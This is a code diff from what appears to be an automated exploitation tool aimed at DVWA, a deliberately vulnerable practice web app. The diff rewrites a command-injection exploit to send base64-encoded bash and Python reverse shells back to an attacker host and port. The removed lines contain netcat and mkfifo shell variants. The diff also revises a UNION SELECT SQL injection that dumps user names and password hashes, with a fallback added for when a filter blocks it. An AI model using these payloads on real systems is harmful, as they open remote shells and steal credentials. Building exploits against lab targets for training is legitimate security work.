@@ -4096,6 +4096,7 @@ Key transforms for {host}:
 import socket as _xpl_socket
 import asyncio as _xpl_asyncio
 import urllib.parse as _xpl_urlparse
+import base64    as _xpl_b64
 
 
 # ── In-memory shell-session registry (persistent across HTTP polls) ──
@@ -4344,22 +4345,27 @@ async def exploit_dvwa_cmdi(target: str, sid: str, lhost: str, lport: int) -> di
     except Exception as e:
         return {"ok": False, "error": f"Could not bind reverse-shell port {lport}: {e}",
                 "cve": "DVWA-CMDI-Low"}
-    # 5. Submit the injected command. Use a multi-fallback payload so it works
-    #    regardless of whether the DVWA container has bash /dev/tcp, nc -e, or
-    #    only python. Each variant is tried in series; first one that connects wins.
-    py_oneline = (
-        f"python -c 'import socket,os,pty;s=socket.socket();"
-        f"s.connect((\"{lhost}\",{lport}));"
-        f"[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn(\"/bin/sh\")'"
+    # 5. Build a base64-encoded payload. Encoding sidesteps every quoting
+    #    problem (DVWA's shell_exec already wraps things in single quotes;
+    #    nested quotes in the injection break parsing). The decode-and-exec
+    #    runner tries bash first, then python3, then python — first that
+    #    works wins. base64 contains only [A-Za-z0-9+/=] so it survives
+    #    URL-encoding and any PHP magic-quotes layer intact.
+    bash_rs   = f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"
+    python_rs = (f"import socket,os,pty\n"
+                 f"s=socket.socket()\n"
+                 f"s.connect(('{lhost}',{lport}))\n"
+                 f"[os.dup2(s.fileno(),f) for f in (0,1,2)]\n"
+                 f"pty.spawn('/bin/sh')")
+    bash_b64   = _xpl_b64.b64encode(bash_rs.encode()).decode().strip()
+    python_b64 = _xpl_b64.b64encode(python_rs.encode()).decode().strip()
+    payload = (
+        f"127.0.0.1; ("
+        f"(echo {bash_b64}|base64 -d|bash) || "
+        f"(python3 -c \"import base64;exec(base64.b64decode('{python_b64}'))\") || "
+        f"(python -c \"import base64;exec(base64.b64decode('{python_b64}'))\")"
+        f") >/dev/null 2>&1 &"
     )
-    py3_oneline = py_oneline.replace("python", "python3")
-    bash_dev_tcp = f"bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'"
-    nc_e = f"nc {lhost} {lport} -e /bin/sh"
-    nc_mkfifo = (f"rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | "
-                 f"nc {lhost} {lport} > /tmp/f")
-    payload = (f"127.0.0.1; "
-               f"({bash_dev_tcp} || {py3_oneline} || {py_oneline} || "
-               f"{nc_e} || {nc_mkfifo}) >/dev/null 2>&1 &")
     try:
         # CSRF token first
         ipage = sess.get(f"{base}/vulnerabilities/exec/", timeout=8, verify=False)
@@ -4426,12 +4432,26 @@ async def exploit_dvwa_sqli(target: str, sid: str) -> dict:
                   data={"username": "admin", "password": "password",
                         "Login": "Login", "user_token": token},
                   timeout=8, verify=False, allow_redirects=True)
-        sess.get(f"{base}/security.php?security=low", timeout=5,
-                 verify=False, cookies={"security": "low"})
-        # UNION SELECT — dump users table. Force the security cookie too.
-        payload = "1' UNION SELECT user,password FROM users-- -"
+        # Set the security cookie ONCE on the session so all subsequent
+        # requests carry it without us having to merge cookies on each call
+        # (which can produce duplicate Cookie headers Apache rejects with 400).
+        sess.cookies.set("security", "low", path="/")
+        sess.get(f"{base}/security.php?security=low", timeout=5, verify=False)
+        # UNION SELECT — dump users table. Use `#` (MySQL comment) instead
+        # of `-- -`; the dash-dash-space sequence in the URL trips some Apache
+        # configs into 400 Bad Request even after URL encoding.
+        payload = "1' UNION SELECT user,password FROM users#"
         url = f"{base}/vulnerabilities/sqli/?id={_xpl_urlparse.quote(payload)}&Submit=Submit"
-        r = sess.get(url, timeout=8, verify=False, cookies={"security": "low"})
+        r = sess.get(url, timeout=10, verify=False)
+        # If we still get a 400, try once more with a different comment style.
+        if r.status_code == 400:
+            payload = "1' OR '1'='1' UNION SELECT user,password FROM users-- a"
+            url = f"{base}/vulnerabilities/sqli/?id={_xpl_urlparse.quote(payload)}&Submit=Submit"
+            r = sess.get(url, timeout=10, verify=False)
+        if r.status_code == 400:
+            return {"ok": False,
+                    "error": "Both SQLi payload variants returned HTTP 400 Bad Request from Apache. The DVWA build may have mod_security or a request filter blocking the injection.",
+                    "cve": "DVWA-SQLi-Low"}
         # DVWA renders one <pre> block per row. Walk the blocks and pull the
         # user + hash out of each by stripping HTML and scanning the plain text.
         rows = []
